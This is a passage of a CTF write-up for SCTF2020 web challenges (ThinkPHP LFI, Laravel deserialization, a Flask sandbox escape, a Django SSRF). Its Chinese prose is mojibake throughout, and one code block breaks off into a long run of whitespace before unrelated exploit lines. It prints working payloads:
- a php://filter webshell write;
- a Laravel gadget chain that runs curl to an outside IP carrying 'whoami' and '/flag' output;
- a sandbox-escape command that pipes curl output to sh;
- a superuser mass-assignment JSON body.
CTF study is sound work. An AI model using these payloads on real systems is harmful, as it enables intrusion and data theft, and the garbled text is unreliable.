éƒ½èƒ½è¿›ã€‚ä¸è¿‡æ¯•ç«Ÿæˆ‘ä»¬æ”¶è·äº†ä¸€ä¸ªæ–°è·¯ç”±<code>/public/nationalsb/</code>æœæ–­å»è¿™çœ‹çœ‹ã€‚</p><p>åŒæ ·è¿˜æ˜¯ç›´æ¥çœ‹ç½‘é¡µæºç ,å‘ç°åŠŸèƒ½åˆæ˜¯ä¸ªé™æ€çš„ã€‚ä½†æ˜¯æœ‰ä¸ªjsæ–‡ä»¶ã€‚ç‚¹è¿›å»æ”¶è·æç¤ºã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/username:Admin1964752</span><br><span class="line">//password:DsaPPPP!@#amspe****</span><br><span class="line">//Secret **** is your birthday</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶å¯†ç åå››ä½è¦çˆ†ç ´ã€‚éšä¾¿å†™ä¸ªè„šæœ¬å‡ºåå››ä½å¥½äº†ã€‚è¿™ç§çˆ†ç ´é‡ç›¸æ¯”ä¹‹å‰hacktheboxçš„é‡å·²ç»éå¸¸å‹å¥½ã€‚</p><p>æœ€åçˆ†å‡ºå¯†ç åç¼€1221.ç™»å½•æ—¶çš„å†…å®¹æç¤ºæˆ‘ä»¬å¯ä»¥postfile.å®éªŒåæ˜¯ä¸ªlfi.ä¸è¿‡æ˜¾ç„¶åšäº†å¤„ç†ï¼Œä¸èƒ½è¯»å–<code>/flag</code>è·Ÿå¸¦æœ‰logçš„(è¿™é‡Œæˆ‘ä»¥ä¸ºæ˜¯banäº†login,ä½†åæ¥å‘ç°æ˜¯banäº†logâ€¦).é‚£ä¹ˆåŸºäºè¿™æ˜¯ä¸ªtp5.0.24.æœæ–­dumpæºç å¥½äº†</p><p>ç°åœºä¸‹äº†ä¸ªtp5.0.24çš„æºç ã€‚æœ€é‡è¦çš„è‚¯å®šæ˜¯æ§åˆ¶å™¨æºç ã€‚æ‰€ä»¥è¯»å–<code>application/index/controller/Index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#r=requests.get(un_url+tmp_unserialize_payload)</span></span><br><span class="line">r=requests.get(un_url+unserialize_payload)</span><br><span class="line">r=requests.post(<span class="string">'http://39.99.41.124/public/3b58a9545013e88c7186db11bb158c44.php'</span>,data=&#123;</span><br><span class="line">    <span class="string">'ccc'</span>:<span class="string">"system('cat /flag');"</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>æœ€åå†å›è¿‡å¤´è§£é‡Šä¸‹ä½¿ç”¨è¿‡æ»¤å™¨çš„åŸå› å§ã€‚å› ä¸ºä¹‹å‰éƒå¸ˆå‚…å®æˆ˜ä¸­é‡åˆ°äº†ï¼Œæ‰€ä»¥æœ‰è¿™ä¸¤ä¸ªå‘ç‚¹</p><ul><li>short open tag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?cuc</span><br><span class="line">&#x2F;&#x2F;000000000000</span><br><span class="line"> rkvg();?&gt;</span><br><span class="line">æŠ¥é”™ Parse error: syntax error, unexpected &#39;rkvg&#39; (T_STRING)</span><br></pre></td></tr></table></figure>å› ä¸ºé»˜è®¤æ”¯æŒçŸ­æ ‡ç­¾çš„åŸå› ï¼Œç”±äº &lt;?cucï¼Œä¹Ÿå°±æ˜¯ &lt;?åé¢å‡ºç°äº† cuc å­—ç¬¦ä¸²ï¼Œä½¿å¾—ä»£ç è¯­æ³•ä¸åˆæ ¼ï¼Œphp æŠ¥é”™é€€å‡ºæ‰§è¡Œã€‚</li></ul><p>å› æ­¤,è¦ç´ å…¶å®å°±æ˜¯ç»•è¿‡è¿™ä¸ªexit()ã€‚è¦æƒ³<code>&lt;,?</code>ä¸è¢«è¯†åˆ«ã€‚æˆ‘ä»¬å¯ä»¥ç”¨string.strip_tagsè¿‡æ»¤å™¨æ¥è§£å†³ã€‚ä½†æ˜¯è¦è®©shellä»£ç <code>&lt;?php eval(xxx)</code>ä¸è¢«è¿‡æ»¤ã€‚æˆ‘ä»¬å¯ä»¥ç”¨convert.base64-decodeè¿‡æ»¤å™¨æ¥è§£å†³ã€‚æ‰€ä»¥è¦ç´ å°±æ˜¯ä¸¤ç§è¿‡æ»¤å™¨æ­é…ã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦è§£å†³çš„æœ€é‡è¦çš„é—®é¢˜ï¼Œå°±æ˜¯base64è§£é‡Šå™¨é‡åˆ°ç­‰å·å°±ç›´æ¥ç»“æŸäº†ã€‚æ‰€ä»¥è¿˜è¦æƒ³åŠæ³•è®©æ–‡ä»¶åä¸­ä¸å‡ºç°<code>=</code>.</p><p>è¿™é‡Œå°±å¯ä»¥ä½¿ç”¨phpé»˜è®¤æ”¯æŒçš„iconvè¿‡æ»¤å™¨ã€‚ä¼˜åŠ¿åœ¨äºï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨iconvè¿™ä¸ªshellå‘½ä»¤æ”¯æŒçš„æ‰€æœ‰ç¼–ç è¿›è¡Œè½¬æ¢ã€‚<br>è€Œä¹‹å‰æˆ‘ä»¬åœ¨å„ç§æ¯”èµ›ä¸­åº”è¯¥ä¹Ÿæ¥è§¦è¿‡è½¬ç ä¸ºutf-7çš„webshelläº†ã€‚æ¯”å¦‚XNUCA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cc&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;123.txt&#39;;</span><br><span class="line">file_put_contents($cc,&#39;&#x3D;&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line">123.txt å†™å…¥çš„å†…å®¹ä¸º: +AD0-</span><br><span class="line">**&#x2F;</span><br></pre></td></tr></table></figure><p>+AD0-å¯ä»¥è¢«base64è¿‡æ»¤å™¨è§£ç ,æ‰€ä»¥è¯´æˆ‘ä»¬å°±èƒ½æˆåŠŸå†™å…¥shelläº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g&#x2F;..&#x2F;</span><br></pre></td></tr></table></figure><p>è€Œä¸”ç”Ÿæˆçš„æ–‡ä»¶åä¸ä¼šåƒrot13é‚£æ ·æœ‰å¥‡æ€ªçš„å‰ç¼€ã€‚æˆ‘ä»¬ç›´æ¥å¾—åˆ°md5ä½œä¸ºæ–‡ä»¶åçš„phpã€‚(å€¼å–å†³äºä½ çš„fileç±»ä¸­çš„$tagå€¼,å¾ˆå¤šexpé‡Œå°±æ˜¯true.æ‰€ä»¥ç®—md5(â€˜tag_â€™+md5(â€˜1â€™))å°±è¡Œäº†)</p><p>å½“ç„¶å› ä¸ºbase64æ˜¯8byteè§£ç ã€‚å®é™…éœ€è¦æ ¹æ®è‡ªå·±çš„payloadè¡¥è¶³a.å½“ç„¶æœ€å¤šè¡¥è¶³4ä¸ªå°±è¡Œã€‚æ‰€ä»¥FUZZä¸‹å°±èƒ½è§£å†³é—®é¢˜<br><img src="/2020/07/05/SCTF2020-writeup/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥è¯´çœŸçš„æ‹‰èƒ¯ã€‚è¿˜é ç€éƒå¸ˆå‚…çš„è€æœ¬ä»¥ä¸ºå å°½å…ˆæœºã€‚å´å› ä¸ºä¸€äº›å°ç»†èŠ‚èµ°å…¥è¯¯åŒºã€‚å¯èƒ½è¿™å°±æ˜¯æ¸—é€å§ã€‚</p><h1 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h1><p>æˆ‘è¦æ˜¯å®¡è¿‡laravel5.8RCEä»¥å¤–çš„é“¾å­ä¼šæ˜¯è¿™ä¸ªåŠæ ·.jpgâ€¦..ç¬¬äº”ç©ºé—´çš„laravelå› ä¸ºå®¡è¿‡é“¾å­æ‰€ä»¥ç›´æ¥ç§’äº†ã€‚è¿™ä¸ªå› ä¸ºæ²¡å®¡è¿‡çœ‹éƒ½æ²¡çœ‹æ‡‚,å±å®æ‹‰èƒ¯ã€‚</p><p>å…¶å®å°±æ˜¯CVE-2018-15133.å› ä¸º.envé‡Œç»™äº†keyæ‰€ä»¥å°±èƒ½ç›´æ¥æ‰“ã€‚<br>payloadå¯ä»¥ç”¨ç¬¬äº”ç©ºé—´çš„payloadã€‚å› ä¸ºä»¥å‰åœ¨phpæ¡†æ¶ç»ƒä¹ ä¸­æŠ¤ç½‘æ¯çš„éé¢„æœŸé‡Œæè¿‡è¿™ä¸ªé“¾å­äº†ã€‚æ‰€ä»¥å°±ä¸æ·±è°ˆäº†ã€‚ç„¶åç¬¬äº”ç©ºé—´å°±æ˜¯æ”¹äº†ä¸€ä¸ªç±»çš„destructã€‚æ¢äº†å¦ä¸€ä¸ªç±»çš„destructè¿˜èƒ½è§¦å‘__getã€‚è¿™é‡Œå¯ä»¥ç”¨ä¸¤ä¸ªç±»éƒ½èƒ½ç”¨ã€‚</p><p>payloadç”¨ggcç”ŸæˆæŒºçœäº‹çš„ã€‚å½“ç„¶ç›´æ¥ç”¨ä¹‹å‰rceexpçš„ä¹Ÿå¯ä»¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:40:&quot;Illuminate\Broadcasting\PendingBroadcast&quot;:2:&#123;s:9:&quot;*events&quot;;O:28:&quot;Illuminate\Events\Dispatcher&quot;:1:&#123;s:12:&quot;*listeners&quot;;a:1:&#123;s:28:&quot;curl 120.27.246.202&#x2F;&#96;whoami&#96;&quot;;a:1:&#123;i:0;s:6:&quot;system&quot;;&#125;&#125;&#125;s:8:&quot;*event&quot;;s:28:&quot;curl xxxxx&#x2F;&#96;cat &#x2F;flag&#96;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>base64åè”åˆkeyé€ç»™æŸcvephpå³å¯ã€‚å½“ç„¶ä¹Ÿèƒ½ç›´æ¥è°ƒç”¨ç”Ÿæˆã€‚<br>å…¶ä»–æˆ˜é˜Ÿå¤§ä½¬çš„wpå†™çš„è‚¯å®šæ¯”æˆ‘å¥½ã€‚æˆ‘å°±ä¸æ”¾expäº†ã€‚</p><p><img src="/2020/07/05/SCTF2020-writeup/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>çœ‹åˆ°é¢„æœŸè§£æ˜¯é€šè¿‡è¦†ç›–sessionååºåˆ—åŒ–ã€‚è¿™å°±èƒ½è§£é‡Šindexçš„è·¯ç”±è®¾ç½®äº†ã€‚å¯æƒœäº†æœ¬æ¥ä¸€ä¸ªå¾ˆéš¾ç»•è¿‡çš„é¢˜éƒ½è¢«å¤§å®¶åˆ©ç”¨æ¡†æ¶çš„æ´æ‰“æˆRCEäº†â€¦â€¦</p><h1 id="pysandbox-1-amp-2"><a href="#pysandbox-1-amp-2" class="headerlink" title="pysandbox 1&amp;2"></a>pysandbox 1&amp;2</h1><p>é¢˜ç›®è™½ç„¶æ˜¯æ²™ç›’é€ƒé€¸ã€‚ä½†å…¶å®ç”¨çš„expè‡ªå·±ä¹‹å‰ä¹Ÿç”¨è¿‡.çœ‹å®˜æ–¹wpç”¨çš„å½“åˆtokyowesternçš„è„šæœ¬å€’æ˜¯æŒºæƒŠè®¶çš„ã€‚å› ä¸ºè‡ªå·±å‰ä¸ä¹…åšå®‰æ’æ¯”èµ›æ—¶ä¹Ÿç”¨è¿‡shrineé‚£é¢˜çš„è„šæœ¬ã€‚æ€»ä¹‹å°±æ˜¯èƒ½ç›´æ¥fuzzå‡ºä¸€æ¡ç»§æ‰¿é“¾ï¼Œç›¸å½“å¥½ç”¨ã€‚</p><p>å…ˆæ¥å­¦ä¹ ä¸‹dalaoä»¬çš„è®¾ç½®é™æ€ç›®å½•çš„åšæ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?POST&#x3D;%2f</span><br><span class="line"></span><br><span class="line">cmd&#x3D;app.static_folder&#x3D;request.args[request.method]</span><br></pre></td></tr></table></figure><p>è®¾ç½®é™æ€ç›®å½•ä¸º<code>/</code><br>ä¹‹åå³å¯è®¿é—®<code>static/flag</code><br><img src="/2020/07/05/SCTF2020-writeup/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åå°±æ˜¯RCEäº†ã€‚è¿™é‡Œå…¶å®è‡ªå·±ä¹‹å‰FUZZè¿‡ä¸€æ¬¡ã€‚å°±æ˜¯ç”¨shrineé‚£ä¸ªè„šæœ¬fuzzå‡ºä¸€æ¡è·å–appçš„é“¾ã€‚</p><p>å½“ç„¶è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªå¾ˆç®€å•çš„æ–¹æ³•ã€‚åˆ†äº«ä¸‹W4nderå¸ˆå‚…çš„<br><a href="http://phoebe233.cn/index.php/archives/53/#pysandbox2" target="_blank" rel="noopener">http://phoebe233.cn/index.php/archives/53/#pysandbox2</a><br>å› ä¸ºordæ˜¯åœ¨builtinsé‡Œçš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¦†ç›–ã€‚ä¹‹ååŒç†å†è¦†ç›–æ‰è·¯ç”±å‡½æ•°ã€‚åˆ©ç”¨lambdaåŒ¿åå‡½æ•°ã€‚éå¸¸å·§å¦™ã€‚<br><img src="/2020/07/05/SCTF2020-writeup/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¦‚æœæ˜¯å®˜æ–¹çš„æ€è·¯,è·Ÿæˆ‘ä¸€å¼€å§‹çš„æƒ³æ³•åº”è¯¥å·®ä¸å¤šã€‚é“ç†å°±æ˜¯å‡½æ•°åŠ«æŒã€‚å½“ç„¶å‰ææ˜¯èƒ½è·å–åˆ°å¯æ§å˜é‡çš„æ¨¡å—ã€‚å‡ºé¢˜äººæ‰¾çš„æ˜¯werkzeug.urls.url_parseã€‚è¿™é‡Œæˆ‘ä¹Ÿç”¨shrineå½“æ—¶çš„è„šæœ¬æ¥fuzzä¸‹ã€‚</p><p>search.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># search.py</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(obj, max_depth)</span>:</span></span><br><span class="line">    </span><br><span class="line">    visited_clss = []</span><br><span class="line">    visited_objs = []</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">(obj, path=<span class="string">'obj'</span>, depth=<span class="number">0</span>)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> path, obj</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> depth == max_depth:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (int, float, bool, str, bytes)):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, type):</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_clss:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_clss.append(obj)</span><br><span class="line">            print(obj)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_objs:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_objs.append(obj)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># attributes</span></span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> dir(obj):</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">'__'</span>) <span class="keyword">and</span> name.endswith(<span class="string">'__'</span>):</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span>  (<span class="string">'__globals__'</span>, <span class="string">'__class__'</span>, <span class="string">'__self__'</span>,</span><br><span class="line">                                 <span class="string">'__weakref__'</span>, <span class="string">'__objclass__'</span>, <span class="string">'__module__'</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            attr = getattr(obj, name)</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> visit(attr, <span class="string">'&#123;&#125;.&#123;&#125;'</span>.format(path, name), depth + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># dict values</span></span><br><span class="line">        <span class="keyword">if</span> hasattr(obj, <span class="string">'items'</span>) <span class="keyword">and</span> callable(obj.items):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> obj.items():</span><br><span class="line">                    <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(k)), depth)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># items</span></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (set, list, tuple, frozenset)):</span><br><span class="line">            <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(obj):</span><br><span class="line">                <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(i)), depth)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> visit(obj)</span><br></pre></td></tr></table></figure><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> search <span class="keyword">import</span> search</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> path, obj <span class="keyword">in</span> search(request, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> str(obj)==<span class="string">"werkzeug.urls"</span>:</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºè¦è·å–åˆ°<code>werkzeug.urls</code>è¿™ä¸ªç±»ã€‚æ‰€ä»¥æ”¹æˆ<code>if str(obj)==&quot;werkzeug.urls&quot;</code>ç„¶åå†æœ¬åœ°è·‘èµ·è¿™ä¸ªflask.è®¿é—®ä¸‹<code>/shrine/</code>è¿™ä¸ªè·¯ç”±+éšä¾¿ä»€ä¹ˆã€‚æ–¹ä¾¿å®ƒè·å–åˆ°requestã€‚è¿™æ ·å°±èƒ½è¿”å›ä¸€æ¡åˆ©ç”¨é“¾ã€‚<br><img src="/2020/07/05/SCTF2020-writeup/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.__class__._get_current_object.__globals__[&#39;ClosingIterator&#39;].close.__globals__[&#39;uri_to_iri&#39;].__globals__[&#39;__name__&#39;]</span><br></pre></td></tr></table></figure><p>ç„¶åä¸èƒ½ç”¨å¼•å·å½“ç„¶åªèƒ½æ˜¯request.argsç»•è¿‡(è·Ÿä¸Šé¢ä¸€æ ·)ã€‚ä½¿ç”¨request.hostï¼Œrequest.headersä¹‹ç±»çš„æŠŠè¦ä¼ çš„å€¼æ”¾headeré‡Œå³å¯ã€‚åŠ«æŒurl_parse()è·å–å‡½æ•°eval()ã€‚ç„¶ååé¢url_parseå› ä¸ºç›´æ¥å¤„ç†è·¯ç”±ã€‚é‚£å°±å¯ä»¥ç›´æ¥è·¯ç”±ä¼ å‘½ä»¤RCEã€‚<br><code>__import__(&#39;os&#39;).system(&#39;curl$IFSxxxxx|sh&#39;)</code></p><p>é¢˜ç›®å…¶å®ä¸éš¾ï¼Œä½†æ˜¯è‡ªå·±åæ¥çœ‹éƒ½æ²¡çœ‹,è·‘å»çœ‹asisäº†ã€‚</p><h1 id="jsonhub"><a href="#jsonhub" class="headerlink" title="jsonhub"></a>jsonhub</h1><p>é¢˜ç›®å› ä¸ºweb1æ˜¯djangoçš„åŸå› ï¼Œå¯¼è‡´è‡ªå·±ç¬¬ä¸€æ­¥ä¸ç†Ÿæ‚‰è€Œç›´æ¥æ–­æ‰æ€è·¯ã€‚åé¢çš„ssrfä¸sstiåè€Œè¿˜æœ‰ç»éªŒ,åº”è¯¥å±äºè‡ªå·±ä¸ç†Ÿæ‚‰djangoçš„é—®é¢˜å§ã€‚</p><p>é¢˜ç›®å¼€å§‹çš„å‚æ•°æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;byc_401&quot;,&quot;password&quot;:&quot;123&quot;,&quot;is_staff&quot;:1,&quot;is_superuser&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™ä¸¤ä¸ªå­—æ®µåº”è¯¥æ˜¯å› ä¸ºUseræ¨¡å‹çš„ç¼˜æ•…ã€‚å±äºdjangoé»˜è®¤çš„ä¸¤ä¸ªåˆ—åã€‚<br>åå°ç™»å½•åæ‹¿åˆ°token<br><img src="/2020/07/05/SCTF2020-writeup/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥æ˜¯æºç ä¸­ä¸€ä¸ªéœ€è¦åˆ©ç”¨cveç»•è¿‡çš„éƒ¨åˆ†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">white_list = [<span class="string">"39.104.19.182"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf_check</span><span class="params">(url ,white_list)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(white_list)):</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">"http://"</span> + white_list[i] + <span class="string">"/"</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flask_rpc</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.META[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">"127.0.0.1"</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">"code"</span>: <span class="number">-1</span>, <span class="string">"message"</span>: <span class="string">"Must 127.0.0.1"</span>&#125;)</span><br></pre></td></tr></table></figure><p>å› 